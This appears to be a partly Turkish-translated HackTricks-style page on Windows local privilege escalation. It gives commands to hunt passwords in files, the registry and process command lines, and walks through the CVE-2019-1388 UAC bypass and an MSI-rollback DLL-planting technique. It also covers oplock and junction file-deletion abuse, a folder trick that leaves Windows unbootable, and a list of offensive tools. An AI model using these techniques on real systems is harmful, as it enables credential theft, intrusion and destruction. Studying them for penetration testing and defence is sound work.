**Component Object Model (COM)**, farklı dillerde yazılmış yazılım bileşenleri arasında **intercommunication** sağlayan Windows işletim sistemi içinde yerleşik bir teknolojidir. Her bir COM bileşeni **class ID (CLSID) ile tanımlanır** ve her bileşen bir veya daha fazla arayüz aracılığıyla işlevsellik sunar; bu arayüzler interface IDs (IIDs) ile tanımlanır.

COM sınıfları ve arayüzleri, sırasıyla HKEY\CLASSES\ROOT\CLSID ve HKEY\CLASSES\ROOT\Interface altında kayıt defterinde tanımlanır. Bu kayıt defteri, HKEY\LOCAL\MACHINE\Software\Classes + HKEY\CURRENT\USER\Software\Classes = HKEY\CLASSES\ROOT birleştirilmesiyle oluşturulur.

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola araması**

**Dosya içeriklerini ara**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve parolaları ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** eklentisidir; bu eklentiyi hedef içinde credentials arayan tüm metasploit POST modüllerini **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen passwords içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) sistemden password çıkarmak için başka harika bir araçtır.

Araç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) açık metin olarak bu verileri kaydeden (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) çeşitli araçların **sessions**, **usernames** ve **passwords**'larını arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Düşünün ki **SYSTEM olarak çalışan bir süreç** (`OpenProcess()`) ile **tam erişim**e sahip yeni bir süreç açıyor. Aynı süreç `CreateProcess()` ile **düşük ayrıcalıklara sahip ancak ana sürecin sahip olduğu tüm açık handles'ları devralan** yeni bir süreç de oluşturur.\
Sonra, düşük ayrıcalıklı sürece **tam erişiminiz** varsa, `OpenProcess()` ile oluşturulmuş ayrıcalıklı sürece ait **açık handle'ı** ele geçirip **shellcode** enjekte edebilirsiniz.\
[Bu örneği, **bu zafiyeti nasıl tespit edip suistimal edeceğiniz** hakkında daha fazla bilgi için okuyun.](leaked-handle-exploitation.md)\
[Daha eksiksiz bir açıklama ve farklı izin seviyeleriyle miras kalan süreç ve thread handler'larını (sadece tam erişim değil) test edip suistimal etme yöntemleri için bu diğer yazıyı okuyun.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

Paylaşılan bellek segmentleri, **pipes** olarak adlandırılan, süreçler arası iletişim ve veri aktarımına olanak sağlar.

Windows, ilişkisiz süreçlerin veri paylaşmasına izin veren **Named Pipes** adlı bir özellik sunar; hatta farklı ağlar arasında bile. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir istemci/sunucu mimarisini andırır.

Bir **client** tarafından bir pipe üzerinden veri gönderildiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olduğu takdirde **client**'ın kimliğini **üstlenme** yeteneğine sahiptir. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir süreci** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde o sürecin kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Bu tür bir saldırıyı nasıl gerçekleştireceğinize dair rehberler [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulunabilir.

Ayrıca aşağıdaki araç, burp gibi bir araçla **named pipe iletişimini intercept etmenize** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç**, privescs bulmak için tüm pipe'ları listelemenize ve görmenize izin verir [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

Şu sayfaya bakın: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Kullanıcı olarak shell elde edildiğinde, komut satırında **kimlik bilgileri geçen** zamanlanmış görevler veya yürütülen diğer süreçler olabilir. Aşağıdaki script, her iki saniyede bir süreçlerin komut satırlarını yakalar ve mevcut durumu önceki durumla karşılaştırarak farkları çıktı olarak verir.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## İşlemlerden parolaları çalma

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

If you have access to the graphical interface (via console or RDP) and UAC is enabled, in some versions of Microsoft Windows it's possible to run a terminal or any other process such as "NT\AUTHORITY SYSTEM" from an unprivileged user.

Bu, ayrıcalıkları yükseltmeyi ve aynı zamanda aynı zafiyetle UAC'ı atlamayı mümkün kılar. Ayrıca hiçbir şey yüklemenize gerek yoktur ve süreçte kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığından yararlanmak için şu adımların gerçekleştirilmesi gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı temelde Windows Installer'ın rollback özelliğini suistimal ederek, uninstall sürecinde meşru dosyaların yerine kötü amaçlı dosyalar koymaya dayanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek amacıyla **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra diğer MSI paketlerinin uninstall işlemlerinde rollback dosyalarını depolamak için bu klasörü kullanacaktır ve rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilmiş olacaktır.

Özet teknik şu şekildedir:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream klasörün **indeks meta verisini** depolar.

Yani, bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *dosya* silme API'sini çağırıyor olsanız bile, klasörün kendisini **siler**.

### Klasör İçeriklerini Silmekten SYSTEM EoP'ye
Peki primitive'iniz rastgele dosya/klasör silmenize izin vermiyorsa, ancak **saldırgan-kontrolündeki bir klasörün *içeriğinin* silinmesine izin veriyorsa**?

1. Adım 1: Tuzak bir klasör ve dosya oluşturun
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Oplock, ayrıcalıklı bir süreç `file1.txt`'i silmeye çalıştığında yürütmeyi **duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikle (ör. `SilentCleanup`)
- Bu süreç klasörleri tarar (ör. `%TEMP%`) ve içindekileri silmeye çalışır.
- `file1.txt`'e geldiğinde, **oplock tetiklenir** ve kontrol callback'inize verilir.

4. Adım 4: Oplock callback'inin içinde – silmeyi yönlendir

- Seçenek A: `file1.txt`'i başka bir yere taşı
- Bu, oplock'u bozmayarak `folder1`'i boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'u erken serbest bırakır.

- Seçenek B: `folder1`'i bir **junction**'a dönüştür:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS iç akışını hedef alır — onu silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırak

- SYSTEM süreci devam eder ve `file1.txt`'i silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında şu siliniyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` SYSTEM tarafından silinir.

### From Arbitrary Folder Create to Permanent DoS

Size **create an arbitrary folder as SYSTEM/admin** yapma imkanı veren bir primitive'i istismar edin — hatta **you can’t write files** veya **set weak permissions** olsa bile.

Adı bir **critical Windows driver** olan bir **folder** (not a file) oluşturun, örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode sürücüsüne karşılık gelir.
- Eğer **önceden bir klasör olarak oluşturursanız**, Windows önyüklemede gerçek sürücüyü yükleyemez.
- Sonra, Windows önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözemeyerek başarısız olur**, ve **çöker veya önyüklemeyi durdurur**.
- Harici müdahale olmadan (ör. önyükleme onarımı veya disk erişimi) **geri dönüş yoktur**, ve **kurtarma yoktur**.


## **High Integrity'den System'e**

### **New service**

Eğer zaten bir High Integrity process üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir service oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; aksi takdirde geçerli bir service değilse 20s içinde sonlandırılacaktır.

### AlwaysInstallElevated

High Integrity bir süreçten AlwaysInstallElevated kayıt girdilerini **etkinleştirmeyi** ve bir _**.msi**_ sarmalayıcı kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[Kayıt anahtarları ve bir _.msi_ paketinin nasıl kurulacağı hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Şunu yapabilirsiniz** [**kodunu buradan bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen bunu zaten High Integrity bir süreçte bulacaksınız), SeDebug ayrıcalığıyla (korunan süreçler hariç) **neredeyse herhangi bir süreci açabilir**, sürecin **token**'ını kopyalayabilir ve o token ile **rastgele bir süreç oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip olarak SYSTEM olarak çalışan herhangi bir sürecin** seçilmesini içerir (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM süreçleri de bulabilirsiniz_).\
**Bir örnek kodu burada bulabilirsiniz** [**örnek**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından `getsystem` için kullanılır. Teknik, **bir pipe oluşturmak ve ardından o pipe'a yazması için bir service oluşturmak/istismar etmek** üzerine kuruludur. Ardından, **pipe'ı oluşturan server**, **`SeImpersonate`** ayrıcalığını kullanarak pipe istemcisinin (service) **token**'ını **taklit edebilir** ve SYSTEM ayrıcalıkları elde edebilir.\
Name pipes hakkında [**daha fazlasını öğrenmek isterseniz bunu okuyun**](#named-pipe-client-impersonation).\
High integrity'den System'a name pipes kullanarak nasıl geçileceğine dair bir örnek okumak isterseniz [**bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir **process** tarafından yüklenen bir **dll**'i **hijack** etmeyi başarırsanız, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür ayrıcalık yükseltme için de faydalıdır ve ayrıca yüksek integrite bir süreçten elde edilmesi çok daha kolaydır çünkü dll'lerin yüklendiği klasörlerde **yazma izinleri** olacaktır.\
**Daha fazlasını buradan öğrenebilirsiniz** [**Dll hijacking**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

Okuyun: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Faydalı araçlar

Windows local privilege escalation vectors'ı aramak için en iyi araç: [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol et (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol edin ve bilgi toplayın (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol edin**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanmış parolaları domain üzerinde spray yapar**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen privesc açıklarını ara (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekli)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc açıklarını arar (VisualStudio kullanılarak derlenmesi gerekir) ([**ön-derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak host'u enumerate eder (daha çok bilgi toplama aracıdır, privesc'ten ziyade) (derleme gerekir) **(**[**ön-derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da ön-derlenmiş exe mevcut)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol eder (github'da ön-derlenmiş exe). Tavsiye edilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Tavsiye edilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (proper çalışması için accesschk gerektirmez ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okuyup çalışan exploit'ler önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okuyup çalışan exploit'ler önerir (yerel python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümü kullanarak derlemeniz gerekir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef makinede yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Kaynaklar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Fox'un Peşinde: Kernel Shadows'ta Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
